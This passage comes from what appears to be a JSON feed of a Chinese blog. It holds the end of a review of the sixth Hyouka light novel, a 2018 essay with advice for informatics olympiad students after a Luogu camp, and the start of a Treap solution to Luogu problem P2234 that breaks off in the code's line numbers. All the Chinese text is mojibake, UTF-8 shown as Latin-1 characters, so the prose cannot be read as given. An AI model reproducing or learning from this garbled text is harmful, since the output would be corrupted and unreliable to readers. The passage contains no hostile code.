æ­¤åœ¨æˆ‘ä»¬çœ‹æ¥è¿™å®æ˜¯ä¸€é“å¼€æ”¾çš„é€åˆ†é¢˜ï¼Œé€‰æ‹©ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œå‡ºè·¯å˜å¤šäº†ï¼Œåº”è¯¥å¼€å¿ƒæ‰å¯¹ï¼Œåœ¨æ—äººçœ‹æ¥åƒåç”°æ ¹æœ¬ä¸å¿…è¿™ä¹ˆçƒ¦æ¼ï¼Œç„¶è€Œåœ¨åƒåç”°çœ¼ä¸­æƒ…å†µå´å¹¶éå¦‚æ­¤ã€‚å› ä¸ºå¥¹ä¸æ˜ç™½è¯¥ä¸è¯¥ç”¨è¿™è¿Ÿæ¥çš„ç¿…è†€å±•ç¿…é£ç¿”ã€‚<br>ä¸ç¦æƒ³è¯´å°è¯´è¯»æ¥æ€»æ˜¯å¼¥æ¼«ç€ä¸€ç§æ·¡æ·¡çš„è‹¦æ¶©ï¼ˆå¦‚åŒå°åº•æ–‡å­—æ‰€è¯´ï¼‰ï¼Œè¿œæ²¡æœ‰åŠ¨ç”»æ¥çš„æ˜å¿«ã€‚ç¬¬ä¸€éƒ¨ã€Šå†°è“ã€‹çš„I screamå·²ç»ä¸ºæ•´ä¸ªç³»åˆ—å¥ å®šäº†åŸºè°ƒã€‚ç¬¬ä¸€éƒ¨ä¹¦ä¸­åƒåç”°çš„èˆ…èˆ…å…³è°·çº¯æ›¾è¿™æ ·è·Ÿå¹´å¹¼çš„åƒåç”°è§£é‡Šâ€œå†°è“â€ï¼š<br><strong>â€œæ˜¯è¦å˜åšå¼ºçš„æ„æ€ã€‚å¦‚æœè½¯å¼±çš„è¯ï¼Œæ€»æœ‰ä¸€å¤©ä¼šè¿æ‚²é¸£éƒ½å‘ä¸å‡ºæ¥ã€‚è¿™æ ·çš„è¯ï¼Œå°±ç®—æ´»ç€ï¼Œä¹Ÿåªæ˜¯è¡Œå°¸èµ°è‚‰ã€‚â€</strong><br>ä½œè€…å€Ÿèˆ…èˆ…ä¹‹å£è¯´è¿™æ®µè¯æš—æŒ‡çš„è‡ªç„¶æ˜¯èº«ä¸ºå®¶æ—ç»§æ‰¿äººçš„åƒåç”°çš„æŸç§å‘½è¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¹´å¹¼çš„åƒåç”°åœ¨å¬å®Œèˆ…èˆ…çš„è¿™å¥è¯åå°±å“­äº†ã€‚å¥¹å†…å¿ƒä¸€å®šæ˜¯å¯¹è‡ªå·±â€œç¬¼ä¸­é¸Ÿâ€çš„å‘½è¿åšè¿‡æŸç§æŠ—äº‰çš„ï¼Œä½†å¥¹è®¤ä¸ºè¿™ç§æŠ—äº‰æ— æ³•æ”¹å˜ä»€ä¹ˆï¼Œäºæ˜¯å°±æ­¤æ”¾å¼ƒã€‚ç„¶è€Œæœ‰ä¸€å¤©è¿™ä»¶äº‹çœŸçš„æˆçœŸäº†ï¼Œè¿™ä¸ªæ—¶å€™åƒåç”°æ‰å‘ç°è‡ªå·±å¹¶æ²¡æœ‰ä¸ºæ­¤åšè¿‡ä»»ä½•å‡†å¤‡ï¼Œç”šè‡³è¿è¿™ä»¶äº‹æœ¬èº«æ˜¯ä¸æ˜¯è‡ªå·±çœŸçš„æƒ³è¦çš„ä¹Ÿè¦é‡æ–°æ€è€ƒï¼Œè¿™ä¸ªæ—¶å€™æ‰çœŸæ­£å¼€å§‹æƒ¶æã€‚<br>æŠ˜æœ¨å¯¹è¿™ç§å¿ƒç†æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ¯”å–»ï¼šå¥½æ¯”æœ‰äº›ä¸ä¿¡è€¶ç¨£çš„äººå”±èµæ­Œä¼šè§‰å¾—åˆ«æ‰­ä¸€æ ·ã€‚åŸæœ¬æ²¡æœ‰è‡ªç”±çš„åƒåç”°èƒ½å”±å‡ºæ†§æ†¬è‡ªç”±çš„æ­Œè¯ï¼Œä½†å½“å¥¹çœŸæ­£æœ‰äº†è‡ªç”±ååè€Œå”±ä¸å‡ºæ¥äº†ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼Œå®åˆ™ç¬¦åˆäººç‰©å¿ƒå¢ƒã€‚æ­£å¦‚æ•…äº‹çš„æ ‡é¢˜ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹æ‰€æƒ³ä¼ è¾¾ç»™æˆ‘ä»¬çš„æ„ä¹‰ï¼šç¬¼ä¸­çš„é¸Ÿå„¿ä¼šæ†§æ†¬è‡ªç”±ï¼Œç„¶è€Œæ‰“å¼€é¸Ÿç¬¼åï¼Œå®ƒä»¬å´ä¼šå› <strong>è¿Ÿæ¥çš„ç¿…è†€</strong>è€Œææƒ§ã€‚å…¶å®ï¼Œæœ¬ä¹¦çš„å¦ä¸€ä¸ªè¯‘å<strong>â€œäº‹åˆ°å¦‚ä»Šæ‰å«æˆ‘é£ç¿”â€</strong>æ›´è´´è¿‘åŸæ—¥æ–‡æ ‡é¢˜çš„ç›´è¯‘ï¼Œå¤§å¯ä»¥ä½“ä¼šä¸€ä¸‹ä¸ªä¸­å«ä¹‰ã€‚<br><strong>â€œè¿™è¿Ÿæ¥çš„ç¿…è†€ï¼Œè®©æˆ‘ä¸çŸ¥æ‰€æªã€‚â€</strong><br>åƒåç”°è¯´å‡ºçš„è¿™å¥è¯å†²å‡»åŠ›å·¨å¤§ã€‚<br>å¿½ç„¶è€Œè‡³çš„è‡ªç”±ï¼Œå……æ»¡æœªçŸ¥ä¸å¯èƒ½æ€§çš„äººç”Ÿï¼Œå¦‚æ­¤ä¹‹å¤§çš„å†²å‡»ï¼Œå¿…ç„¶åŠ¨æ‘‡äº†åƒåç”°å¤šå¹´æ¥ä½œä¸ºåƒé‡‘åƒåç”°æ‰€å­˜åœ¨çš„æ„ä¹‰ã€‚å³ä½¿æˆ‘ä»¬ä¸çŸ¥é“åƒåç”°åŸæœ¬æ„¿æ„è¢«ç»§æ‰¿äººçš„èº«ä»½æŸç¼šä¸å¦ï¼Œä¹Ÿä¸çŸ¥é“å¥¹æ˜¯å¦çœŸçš„æ¸´æœ›è‡ªç”±ï¼Œä½†èƒ½ç¡®å®šçš„æ˜¯ï¼Œå¥¹é¢å¯¹æ— é™å¯èƒ½æ€§æ—¶çš„è¿·èŒ«ç»ä¸ä¼šæŒä¹…ã€‚<br>æ•…äº‹åœ¨æŠ˜æœ¨æ‰¾åˆ°åƒåç”°åæˆ›ç„¶è€Œæ­¢ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¯´åšå‡ºä»€ä¹ˆé€‰æ‹©å·²ç»ä¸é‡è¦äº†ã€‚å› ä¸ºè¿™ä¸ªå‘½é¢˜ä¸æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ªäººéœ€è¦æ€è€ƒçš„ï¼š<strong>çœŸæ­£æŸç¼šæˆ‘ä»¬çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ— å½¢çš„å‘½è¿ç‰¢ç¬¼ï¼Œè¿˜æ˜¯å¯¹æ”¹å˜çš„ææƒ§ï¼Ÿ</strong><br>è¿™æœ¬ä¹¦æ²¡æœ‰åè®°ï¼Œå†æ€ä¹ˆçœ‹æœ€åä¸€é¡µéƒ½åªæ˜¯å†·å†°å†°çš„å›¾ä¹¦åœ¨ç‰ˆç¼–ç›®æ•°æ®ï¼Œæˆ‘ç›¸ä¿¡æ²¡æœ‰åè®°æ˜¯å› ä¸ºç±³æ³½ç©—ä¿¡å¸Œæœ›æœ€åè¿™å‡ æ®µå¯¹è¯èƒ½ä¹…ä¹…ç•™å­˜åœ¨è¯»è€…è„‘æµ·ï¼Œæ¯•ç«Ÿè¿™éƒ¨ä¹¦ç›¸è¾ƒäºå‰å‡ éƒ¨å¾ˆç‰¹åˆ«ã€‚<br>ä¸è¿‡ä»¤äººæ„‰æ‚¦çš„æ˜¯ï¼Œæ­¤å¤„å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„å¦ä¸€æ¡çº¿æ¸æ¸æµ®å‡ºï¼šæŠ˜æœ¨ä¸åƒåç”°çš„å…³ç³»ã€‚åƒåç”°å¼•å¯¼äº†æŠ˜æœ¨é‡æ–°æ¸´æœ›ç«ç‘°è‰²çš„äººç”Ÿï¼ŒåŠ¨æ‘‡äº†æŠ˜æœ¨â€œèŠ‚èƒ½ä¸»ä¹‰â€çš„ä¿¡æ¡ï¼Œæˆä¸ºäº†ç»“æŸæŠ˜æœ¨â€œæ‚ é•¿çš„å‡æœŸâ€çš„é‚£ä¸ªäººã€‚å¯ä»¥è¯´ï¼ŒæŠ˜æœ¨å·²ç»å–œæ¬¢ä¸Šäº†å¥¹ã€‚æ—¢ç„¶åƒåç”°çš„è¿·èŒ«ä¸ä¼šæŒä¹…ï¼Œå› ä¸ºæ­¤æ¬¡ç»å†ï¼Œåƒåç”°åœ¨æ­¤ä¹‹åå¿…ç„¶ä¼šå’ŒæŠ˜æœ¨åŠ æ·±ç¾ç»Šã€‚è¯·æœŸå¾…å§ã€‚</p>\n<h2 id=\"PSâ€¦â€¦ï¼Ÿ\"><a href=\"#PSâ€¦â€¦ï¼Ÿ\" class=\"headerlink\" title=\"PSâ€¦â€¦ï¼Ÿ\"></a>PSâ€¦â€¦ï¼Ÿ</h2><p>è¯´æ˜¯æ ¡å›­æ¨ç†çš„å°è¯´ï¼Œä½†å®é™…ä¸Šè®¸å¤šæ¢è®¨çš„äº‹ç‰©ä¸€ç‚¹ä¹Ÿä¸æ ¡å›­ï¼Œæ›´ä¸æ˜¯ä¸ºäº†æ¨ç†è€Œæ¨ç†ï¼Œæ›´å¤šçš„æ˜¯å¯¹æˆé•¿ã€ç¤¾ä¼šã€äººç”Ÿä»·å€¼çš„æ€è€ƒã€‚ä¸å…¶è¯´æ˜¯è½»å°è¯´ï¼Œæˆ‘åå‘äºè®¤ä¸ºè¿™æ˜¯çº¯æ–‡å­¦ã€‚<br>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘å–œæ¬¢ã€‚<br>å¸Œæœ›å¤§å®¶èƒ½åˆ†äº«ä¸€ä¸‹å…³äºè¿™æœ¬ä¹¦çš„æ„Ÿæƒ³å§ã€‚</p>\n<hr>\n<p>å‚è€ƒ<a href=\"//www.zhihu.com/question/39576283/answer/82242206\">è€³æœµè¯»ä¹¦ | è¯»ã€Šå†°è“å·6Â·è¿Ÿæ¥çš„ç¿…è†€ã€‹æœ‰æ„Ÿ</a><br>å¥‰ä¸Šå¾ˆæ£’çš„è¯„è®ºï¼š<a href=\"//www.zhihu.com/question/21576885/answer/29840285\">å¦‚ä½•è¯„ä»·ã€Šå†°è“ã€‹è¿™éƒ¨åŠ¨ç”»ï¼Ÿ-Nasusuçš„å›ç­”</a></p>\n",
            "tags": [
                "å†°è“",
                "å¤ç±ç ”ç©¶ç¤¾"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/",
            "url": "http://cubicy.icu/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/",
            "title": "æ´›è°·å†¬ä»¤è¥éšæƒ³",
            "date_published": "2018-02-28T14:56:00.000Z",
            "content_html": "<p>æ´›è°·æ˜¥ä»¤è¥ç»“æŸä¸ä¹…ï¼Œå°±æˆ‘ä¸ªäººè€Œè¨€å®åœ¨æ˜¯æ”¶ç›Šè‰¯å¤šã€‚<br>è¯¾åä¸æ´›è°·çš„è®²å¸ˆä»¬ç•¥æœ‰äº¤è°ˆï¼Œå¹¶ä¸”ç¨å¾®æ¥è§¦äº†åˆ«åœ°çš„ä¿¡ç«ç”Ÿï¼Œé¡¿æ„Ÿå¼±å°â€¦â€¦å†³å®šæŠŠä¸€äº›äº†è§£åˆ°çš„ä¿¡æ¯å’Œæ„Ÿæƒ³æ”¾åœ¨è¿™é‡Œã€‚æ¯”è¾ƒæ‚ï¼Œå°†å°±ç€çœ‹å§ã€‚  </p>\n<hr>\n<p>é¦–å…ˆè¯´ä¸‹è¿‘å¹´ç«èµ›çš„å‘å±•å§ã€‚<br>è¿‘å¹´ä¿¡æ¯å­¦ç«èµ›å¸¦æ¥çš„å‡å­¦ä¼˜åŠ¿å¢å¤§äº†ä¸å°‘ï¼Œæœºä¼šå¢åŠ äº†ï¼Œè¿™æ˜¯å¥½äº‹ã€‚ä½†è¿™åŒæ ·ä¹Ÿæ„å‘³ç€ç«äº‰å°†æ¿€çƒˆè®¸å¤šã€‚<br>ä¸¾å‡ ä¸ªä¾‹å­ï¼š  </p>\n<ul>\n<li>æµ™æ±Ÿå°å­¦ä¾¿åŸ¹è‚²â€œç§å­é€‰æ‰‹â€ï¼Œæµ™æ±Ÿåˆèµ›åˆ†æ•°çº¿ä¸€åº¦è¾¾åˆ°90åˆ†ã€‚  </li>\n<li>è‘—åçš„å—å±±ä¸­å­¦ï¼ŒCç±»ä¹°ä¸åœï¼Œæ­¤å¤„ä¸ç»†è¯´ã€‚  </li>\n<li>å¾ˆå¤§ä¸€éƒ¨åˆ†é€‰æ‰‹ä»¥å®Œå…¨åœè¯¾å¤‡æˆ˜æ¯”èµ›ã€‚</li>\n</ul>\n<p>åˆ‡å®å‚ä¸åˆ°ç«èµ›ä¸­ï¼Œèƒ½æ„Ÿè§‰åˆ°è®¸å¤šå­¦æ ¡å·²ç»ä¸ºæ­¤ç–¯ç‹‚äº†ã€‚ç©¶å…¶åŸå› æ˜¯ç­¾çº¦æœºä¼šå˜å¤šäº†ã€‚  </p>\n<ul>\n<li>NOIPè·å¾—æé«˜åˆ†æœ‰å‡ ç‡æå‰ç­¾  </li>\n<li>å†¬ä»¤è¥&#x2F;å¤ä»¤è¥ï¼ˆWC&#x2F;SCï¼‰  </li>\n<li>APIO  </li>\n<li>çœé€‰  </li>\n<li>NOI  </li>\n<li>â€¦â€¦</li>\n</ul>\n<p>C9å¤§å­¦ç«ç›¸ç”©å‡ºäº†ä¸å°‘ä¸€æœ¬çº¿å½•å–çš„çº¦ã€‚ç›¸æ¯”äºè£¸è€ƒçœTOP100ï¼ˆç¦å»ºï¼‰æ‰æœ‰å¸Œæœ›è¿›PKU&#x2F;THUï¼Œé™è‡³ä¸€æœ¬çº¿å½•å–æ— ç–‘æ˜¯æ·å¾„ã€‚éš¾æ€ªä¼—å¤šå­¦æ ¡ä¸ºå…¶â€œç–¯ç‹‚â€â€¦â€¦<br>åœ¨æˆ‘çœ‹åˆ°äº†é›…ç¤¼ä¸­å­¦ã€å—å±±ä¸­å­¦ã€ç¦å¸ˆå¤§é™„ä¸­ã€ç¦å·ä¸‰ä¸­ã€é•¿éƒ¡ä¸­å­¦ã€æ­å·äºŒä¸­ç­‰ç­‰å¼ºæ ¡çš„æˆç»©åï¼Œæˆ‘æ‰å‘ç°æˆ‘ä»¬å·²ç»è½åå¤ªå¤šäº†ã€‚å¥½åœ¨åˆä¸€èµ·æ­¥ï¼Œç°åœ¨å†²åˆºè¿˜æœ‰å¾ˆå¤§å¸Œæœ›ã€‚  </p>\n<hr>\n<p>äºæ˜¯è¦æ³¨æ„ä»€ä¹ˆå‘¢ï¼Ÿ  </p>\n<ol>\n<li>æŒä¹‹ä»¥æ’çš„ç»ƒä¹ ã€‚ä¸­è€ƒåœ¨å³ï¼Œè®¸å¤šäººå®Œå…¨å°†C++ç”©å¼€ï¼Œå…¨åŠ›å¤‡æˆ˜ä¸­è€ƒã€‚ä¸ªäººè®¤ä¸ºæ­¤ä¸¾ä¸å¦¥ã€‚ä¸­è€ƒåœ¨6æœˆä¸‹æ—¬ï¼Œç„¶è€Œ11æœˆä»½ä¾¿æ˜¯æ–°ä¸€æ¬¡NOIpäº†ã€‚å¦‚æœ3æœˆ~6æœˆæ•´æ•´ä¸€ä¸ªå­£åº¦ä¸å†™ä»£ç ï¼Œç»å¯¹ä¼šæ‰‹ç”Ÿäº†ã€‚æ­¤æ—¶æƒ³è¦å›åˆ°ä»å‰çš„çŠ¶æ€å¯èƒ½è¦å¾ˆä¹…ã€‚å› æ­¤å­¦ä¸šå‹åŠ›ä¸å¤§çš„å¯ä»¥è€ƒè™‘æ¯å¤©æŠ½å‡ºæ—¶é—´æƒ³é¢˜ã€åšé¢˜ï¼Œå‘¨æœ«æ‰“æ¯”èµ›ã€‚å­¦ä¹ æˆç»©ä¸ç”šç¨³å®šçš„ï¼Œæ¯å‘¨ä¹Ÿåº”è¯¥åšä¸ª2ã€3é¢˜ï¼Œä¿æŒæ„Ÿè§‰ã€‚å…¶å®ç°åœ¨çœ‹æ¥æˆ‘ä»¬åªå‰©ä¸‹2æ¬¡NOIpçš„æœºä¼šäº†ï¼Œå¿…é¡»å¥½å¥½æŠŠæ¡ã€‚  </li>\n<li>æœ‰æ˜ç¡®çš„TODO-Listã€‚ä¿¡æ¯å­¦çŸ¥è¯†ç‚¹æ¯”è¾ƒç¹æ‚ï¼Œéš¾åº¦å·®å¼‚å¤§ï¼Œå„ç§ç®—æ³•ã€æ•°æ®ç»“æ„æ¯”èµ›å‡ºç°é¢‘ç‡å·®è·æ‚¬æ®Šã€‚äºæ˜¯åœ¨å­¦ä¹ å®ŒæŸäº›å†…å®¹ä¹‹åï¼Œé‡ç‚¹ã€çƒ­ç‚¹è¶çƒ­æ‰“é“ï¼Œç®€å•çš„è¿ç”¨å‡ æ¬¡ã€‚ä½†æ˜¯å­¦ä¹ ä»€ä¹ˆå‘¢ï¼Ÿå¯ä»¥å‚è€ƒã€Šç®—æ³•ç«èµ›å…¥é—¨ç»å…¸â€”â€”è®­ç»ƒæŒ‡å—ã€‹çš„ç›®å½•ã€‚åˆ—å‡ºæ¸…å•ï¼Œé€ä¸€å‡»ç ´ï¼Œæ­¤æ—¶å†å»åˆ·ç»¼åˆé¢˜ï¼Œæ•ˆæœä¸€å®šå¥½ä¸å°‘ã€‚  </li>\n<li>å¤šæ‰“æ¯”èµ›ã€‚ä¸€æ¬¡æ¬¡çš„æ¯”èµ›ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»ƒå¥½å¿ƒæ€ï¼Œå­¦å¥½éª—åˆ†ï¼ŒæŠŠæ¡èŠ‚å¥ã€‚éšä¾¿å»é—®ä¸€ä¸ªå¤§ç‰›â€œå»å“ªé‡Œæ‰“æ¯”èµ›å¥½ï¼Ÿâ€ï¼Œ95%çš„éƒ½ä¼šå‘Šè¯‰ä½ ï¼šCodeforcesã€‚å…¶ç‰¹è‰²çš„èµ›åˆ¶å¾ˆèƒ½è¾¾åˆ°ä»¥ä¸Šç›®çš„ã€‚å¦‚æœæ²¡ç©ºæ€ä¹ˆåŠå‘¢ï¼ˆCFæ¯”èµ›å¤šåœ¨æ·±å¤œï¼‰ï¼Ÿå¯ä»¥æ‰“æ´›è°·çš„æœˆèµ›ï¼Œç»è¿‡å®¡æ ¸çš„å…¬å¼€èµ›ã€‚å¹³å¸¸åšé¢˜æ—¶ï¼Œå¯¹äºæ¯é“é¢˜ï¼Œéƒ½åº”è¯¥ä½¿åŠ²åŠ¨è„‘ï¼Œè¯•ç€å»ä½¿åŠ²éª—åˆ†ï¼Œçœ‹çœ‹èƒ½å¾—åˆ°å¤šå°‘ï¼ˆä¼˜ç§€çš„éª—åˆ†å¾€å¾€èƒ½æ‹¿åˆ°70åˆ†ä»¥ä¸Šï¼Œéå¸¸é‡è¦ï¼æ¯”å¦‚æ¨¡æ‹Ÿé€€ç«ã€çˆ¬å±±ç®—æ³•ï¼‰ã€‚ä¹‹åè¯•å›¾ç¼–å†™æ­£è§£ï¼Œ30minæ²¡æœ‰æ˜ç¡®æ€è·¯ï¼Œå†å»çœ‹é¢˜è§£ã€‚  </li>\n<li>æ‡‚å¾—æ€»ç»“å¥—è·¯ã€‚å°¤å…¶æ˜¯DPçŠ¶æ€è®¾è®¡ã€DPä¼˜åŒ–ã€æœç´¢å‰ªæâ€¦â€¦ç­‰ç­‰ã€‚åˆ·é¢˜å¤šäº†è‡ªç„¶æœ‰ç»éªŒï¼Œä½†æ˜¯è¦å–„äºæ€»ç»“ã€‚  </li>\n<li>å¤šæ¥è§¦ä»–åœ°å¸‚çš„é€‰æ‰‹ã€ç¥çŠ‡ï¼Œä»–ä»¬ä¼šå¾ˆä¹æ„å¸®åŠ©çš„ã€‚ä½ ç”šè‡³å¯ä»¥è¿…é€Ÿçš„å¾—åˆ°çŸ­æœŸè®¡åˆ’ã€å¤§é‡å†…éƒ¨ææ–™â€¦â€¦  </li>\n<li>â€¦â€¦</li>\n</ol>\n<hr>\n<p>ç«èµ›å…·ä½“å†…å®¹ç›¸å…³ï¼š<br>è”èµ›å¸¸è€ƒï¼š<br><img src=\"https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180228225459264-75959639.png\" loading=\"lazy\">  </p>\n<p>æ¨¡æ‹Ÿé¢˜å¤šæ˜¯ç†æ‰€å½“ç„¶ã€‚ä½†æ˜¯DPçš„ä½ç½®å¦‚æ­¤é‡è¦ä¹‹å‰ç¡®å®æ²¡æƒ³åˆ°ï¼ŒDPå¾ˆçœ‹åˆ·é¢˜é‡ã€‚æ•°è®ºéœ€è¦ä¸€å®šçš„çŸ¥è¯†ç§¯ç´¯ï¼Œåˆä¸­ç”Ÿå­¦èµ·æ¥å¯èƒ½è¾ƒéš¾ï¼Œä½†æ˜¯ç®€å•çš„æ‰‹åŠ¨æ‰¾è§„å¾‹å¾ˆæœ‰å¸®åŠ©ã€‚å¤§éƒ¨åˆ†æ¯”èµ›æœç´¢æšä¸¾æš´åŠ›å†™çš„å¥½ï¼Œå‰ªæå‰ªå¾—å¤šå°±èƒ½ç›´æ¥Auã€‚ç»ƒå¥½åŸºæœ¬åŠŸå¾ˆé‡è¦ï¼ˆæ‰€ä»¥å¤šæ‰“æ¯”èµ›ï¼ï¼‰ã€‚<br>è®¡ç®—å‡ ä½•åœ¨çœé€‰ã€NOIä¸­è€ƒçš„è¾ƒå¤šï¼Œä¸å¯ä¸å­¦ã€‚ä¸‰ç»´å‡ ä½•ä»€ä¹ˆçš„å°±ç®—äº†å§ç›®å‰â€¦â€¦<br>å­¦ä¼šé™æ€è°ƒè¯•ã€‚å…ˆåˆ«æ€¥ç€è¾“å‡ºä¸­é—´å˜é‡ï¼Œè‚‰çœ¼å…ˆä»”ç»†æ‰¾æ‰¾æœ‰æ²¡æœ‰é”™è¯¯ï¼Œè€ƒåœºè¿™æ ·èƒ½æœ‰æ•ˆæé«˜æ•ˆç‡ï¼Œé˜²æ­¢å¿ƒæ€å´©ã€‚<br>æœç´¢æšä¸¾ä½¿åŠ²å‰ªæï¼Œä¿è¯ç»“æœæ­£ç¡®çš„æƒ…å†µä¸‹å¹¶ä¸”æœ‰å……è¶³æ—¶é—´ä½¿åŠ²å¸¸æ•°ä¼˜åŒ–ã€‚ç«èµ›ä¸­ï¼Œå¥½çš„å¸¸æ•°ä¼˜åŒ–æœ‰æ—¶èƒœè¿‡ç†è®ºå¤æ‚åº¦ä¸‹é™ä¸€ä¸ªç­‰çº§ã€‚<br>å…ˆå†™æš´åŠ›ï¼Œå†å†™ä¸€èˆ¬æ­£è§£ã€‚è¿™æ ·è¿˜å¯ä»¥æ‹¿ç€2ä¸ªç¨‹åºæŒ‚åå°å¯¹æ‹ï¼Œæ—¢ä¿è¯äº†åŸºç¡€å¾—åˆ†ï¼Œåˆä¸ºæ•ˆç‡æ›´é«˜çš„æ–¹æ³•æä¾›äº†æ­£ç¡®æ€§ä¿éšœã€‚æ³¨æ„è¾¹ç•Œæ•°æ®æ‰‹åŠ¨æ£€éªŒã€‚<br>æŠ€å·§å¯èƒ½æœ‰è®¸å¤šè®¸å¤šï¼Œæ­¤å¤„æ˜¯è¯´ä¸å®Œçš„ã€‚åœ¨æ­¤æ¨èå‡ ä¸ªç½‘ç«™ï¼š<br>Codeforces.com<br>hzwer.com<br>é¡ºå¸¦ä¸€æï¼Œæ´›è°·çš„é¢˜è§£å¸¸å¸¸è®²çš„æ¯”åšå®¢è¿˜å¥½â€¦â€¦<br>ä¿¡æ¯å­¦ç«èµ›è´µåœ¨åšæŒï¼Œæ²¡æœ‰é¢˜é‡ä¸€åˆ‡éƒ½æ˜¯ç©ºè°ˆï¼Œåœ¨æœºæˆ¿é‡Œæ‰“æ¸¸æˆã€é€›çŸ¥ä¹éƒ½æ˜¯ä¸å¦¥çš„ã€‚<br>æ—¶é—´ä¸å¤šäº†ã€‚</p>\n",
            "tags": []
        },
        {
            "id": "http://cubicy.icu/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20[HNOI2002]%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/",
            "url": "http://cubicy.icu/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20[HNOI2002]%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/",
            "title": "æ´›è°·:P2234  [HNOI2002]è¥ä¸šé¢ç»Ÿè®¡",
            "date_published": "2018-02-27T15:58:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€ï¼š<a href=\"//www.luogu.org/problemnew/show/P2234\">https://www.luogu.org/problemnew/show/P2234</a></p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªåºåˆ—ï¼Œå¯¹äºæ¯ä¸€ä¸ªæ•°éƒ½è¦æŸ¥è¯¢ï¼šåºåˆ—ä¸­åœ¨è¿™ä¸ªæ•°å‰ä¸è¿™ä¸ªæ•°æœ€æ¥è¿‘çš„æ•°æ˜¯ä»€ä¹ˆï¼Ÿç„¶åå°†æœ€æ¥è¿‘çš„æ•°å­—ä¸è¿™ä¸ªæ•°å­—çš„å·®ç´¯åŠ ã€‚ï¼ˆåºåˆ—ç¬¬ä¸€ä¸ªæ•°å­—ç›´æ¥åŠ è‡ªå·±ï¼‰  </p>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>æŸ¥è¯¢åœ¨è¿™ä¸ªæ•°ä¹‹å‰ä¸è¿™ä¸ªæ•°æœ€æ¥è¿‘çš„æ•°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ç”¨äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰æ¥åšã€‚<br><del>è™½ç„¶æ•°æ®ç•¥æ°´æš´åŠ›æ’åºæ¯æ¬¡æŸ¥è¯¢ä»ä¸€ä¸ªæ•°å¾€å·¦å³æ‰¾ä¹Ÿèƒ½è¿‡ã€‚</del><br>æ¯æ¬¡æ’å…¥ä¸€ä¸ªæ•°å­—ï¼Œç„¶åæŸ¥è¯¢ï¼Œæˆ‘ç”¨Treapå®ç°ï¼ˆè¿˜æ˜¯å¼±åŒ–ç‰ˆçš„ï¼Œåªæœ‰æ’å…¥æŸ¥è¯¢ï¼‰ã€‚<br>Treapçš„æ ¸å¿ƒå…¶å®å°±æ˜¯æ‰“ä¹±é¡ºåºæ’å…¥é˜²æ­¢è¢«å¡ï¼ˆç²—ç³™ç†è§£ï¼‰ã€‚å…·ä½“å®ç°æ–¹æ³•ä¸éš¾ï¼Œè¯·ç™¾åº¦ã€‚ï¼ˆæˆ‘ä¹‹åä¼šå†™ä¸€ç¯‡ä¸“é—¨ä»‹ç»ä¸‹å„ç§BSTçš„ã€‚ï¼‰<br>PSï¼šTreapæ ‘å®Œæ•´ç‰ˆä¹‹åå†™ã€‚è¿™é¢˜ç”¨STLçš„vectorä¹Ÿè¡Œï¼Œvectorç†è®ºæ¯æ¬¡æ’å…¥æ¸è¿›æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ä½†æ˜¯å¬è¯´å®é™…æ˜¯å¯¹æ•°çº§åˆ«çš„ï¼Ÿ   </p>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span 